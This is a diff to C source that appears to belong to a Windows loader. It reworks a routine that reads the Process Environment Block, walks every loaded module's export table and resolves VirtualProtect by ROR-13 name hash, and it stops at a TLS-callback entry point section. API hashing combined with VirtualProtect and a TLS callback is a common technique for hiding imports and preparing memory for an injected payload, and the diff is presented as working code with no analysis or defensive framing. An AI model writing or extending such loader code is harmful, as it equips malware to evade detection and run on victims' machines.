@@ -122,60 +122,93 @@ static DWORD hash_string(const char* str) {
 }
 
 // ── PEB-walk → resolve VirtualProtect ─────────────────────────
-// Finds kernel32.dll in the PEB loader data, walks exports by
-// ROR-13 hash, returns the function address or 0.
+// Walks the PEB loader module list, finds any module exporting
+// VirtualProtect, resolves it by ROR-13 hash. Returns 0 on failure.
 static QWORD resolve_virtual_protect(void) {
-    // Target hash for "VirtualProtect" — pre-computed
-    const DWORD TARGET_HASH = 0x545E31C5;  // ROR-13("VirtualProtect")
+    // Pre-computed ROR-13 hash of "VirtualProtect"
+    const DWORD TARGET_HASH = 0x545E31C5;
 
 #ifdef _MSC_VER
     QWORD peb;
-    __asm {
-        mov rax, gs:[0x60]
-        mov peb, rax
-    }
+    __asm { mov rax, gs:[0x60]; mov peb, rax; }
 #else
     QWORD peb;
     __asm__ volatile("movq %%gs:0x60, %0" : "=r"(peb));
 #endif
 
-    // PEB → Ldr → InMemoryOrderModuleList → kernel32 → DllBase
-    // The 3rd module in the list is typically kernel32.dll
+    // PEB → Ldr → InMemoryOrderModuleList.Flink
     QWORD ldr = *(QWORD*)(peb + 0x18);
-    QWORD flink = *(QWORD*)(ldr + 0x20);  // InMemoryOrderModuleList.Flink
-    QWORD entry = flink;
+    if (ldr == 0) return 0;
 
-    // Walk to kernel32 (usually 3rd entry, but walk safely)
-    for (int i = 0; i < 3; i++) {
-        if (*(QWORD*)entry == flink) break; // wrapped
-        entry = *(QWORD*)entry;  // Flink
-    }
+    QWORD entry = *(QWORD*)(ldr + 0x20);  // first module in load order
+    if (entry == 0) return 0;
+    QWORD flink_start = entry;
 
-    QWORD dll_base = *(QWORD*)(entry + 0x20);  // DllBase
+    // Walk the module list (up to 20 entries as safety limit).
+    // Do NOT assume a fixed position for kernel32.dll — ordering
+    // varies between Windows versions (Win7, Win10, Win11 differ).
+    // Instead, check every module's export table by hash.
+    for (int mod = 0; mod < 20; mod++) {
+        QWORD dll_base = *(QWORD*)(entry + 0x20);
+        if (dll_base == 0) break;
 
-    // Parse PE header → export directory
-    DWORD pe_sig = *(DWORD*)(dll_base + ((DWORD*)(dll_base + 0x3C))[0]);
-    if (pe_sig != 0x00004550) return 0;  // "PE\0\0"
-
-    QWORD export_dir_rva = *(DWORD*)(dll_base + 0x88);  // IMAGE_DIRECTORY_ENTRY_EXPORT
-    if (export_dir_rva == 0) return 0;
-    BYTE* export_dir = (BYTE*)(dll_base + export_dir_rva);
-
-    DWORD num_names = *(DWORD*)(export_dir + 24);
-    DWORD addr_of_functions = *(DWORD*)(export_dir + 28);
-    DWORD addr_of_names = *(DWORD*)(export_dir + 32);
-    DWORD addr_of_ordinals = *(DWORD*)(export_dir + 36);
-
-    for (DWORD i = 0; i < num_names; i++) {
-        DWORD name_rva = *(DWORD*)(dll_base + addr_of_names + i * 4);
-        const char* name = (const char*)(dll_base + name_rva);
-        if (hash_string(name) == TARGET_HASH) {
-            WORD ordinal = *(WORD*)(dll_base + addr_of_ordinals + i * 2);
-            DWORD func_rva = *(DWORD*)(dll_base + addr_of_functions + ordinal * 4);
-            return dll_base + func_rva;
+        // Read e_lfanew from DOS header and validate PE signature
+        DWORD e_lfanew = *(DWORD*)(dll_base + 0x3C);
+        if (e_lfanew < 0x40 || e_lfanew > 0x1000) {
+            entry = *(QWORD*)entry;
+            if (entry == flink_start) break;
+            continue;
         }
+        if (*(DWORD*)(dll_base + e_lfanew) != 0x00004550) {
+            entry = *(QWORD*)entry;
+            if (entry == flink_start) break;
+            continue;
+        }
+
+        // Determine PE32 vs PE32+ from optional header magic
+        WORD opt_magic = *(WORD*)(dll_base + e_lfanew + 24);
+        DWORD dd_offset;
+        if (opt_magic == 0x020B)       // PE32+
+            dd_offset = 112;
+        else if (opt_magic == 0x010B)  // PE32
+            dd_offset = 96;
+        else {
+            entry = *(QWORD*)entry;
+            if (entry == flink_start) break;
+            continue;
+        }
+
+        // IMAGE_DIRECTORY_ENTRY_EXPORT is the first data directory (index 0)
+        // at optional_header + dd_offset + 0*8
+        DWORD export_dir_rva = *(DWORD*)(dll_base + e_lfanew + 24 + dd_offset);
+        if (export_dir_rva == 0) {
+            entry = *(QWORD*)entry;
+            if (entry == flink_start) break;
+            continue;
+        }
+
+        BYTE* export_dir = (BYTE*)(dll_base + export_dir_rva);
+        DWORD num_names = *(DWORD*)(export_dir + 24);
+        DWORD addr_of_functions = *(DWORD*)(export_dir + 28);
+        DWORD addr_of_names = *(DWORD*)(export_dir + 32);
+        DWORD addr_of_ordinals = *(DWORD*)(export_dir + 36);
+
+        // Walk export name pointer table, hash each name
+        for (DWORD i = 0; i < num_names; i++) {
+            DWORD name_rva = *(DWORD*)(dll_base + addr_of_names + i * 4);
+            const char* name = (const char*)(dll_base + name_rva);
+            if (hash_string(name) == TARGET_HASH) {
+                WORD ordinal = *(WORD*)(dll_base + addr_of_ordinals + i * 2);
+                DWORD func_rva = *(DWORD*)(dll_base + addr_of_functions + ordinal * 4);
+                return dll_base + func_rva;
+            }
+        }
+
+        entry = *(QWORD*)entry;
+        if (entry == flink_start) break;
     }
-    return 0;
+
+    return 0;  // not found
 }
 
 // ── TLS Callback Entry Point ─────────────────────────────────
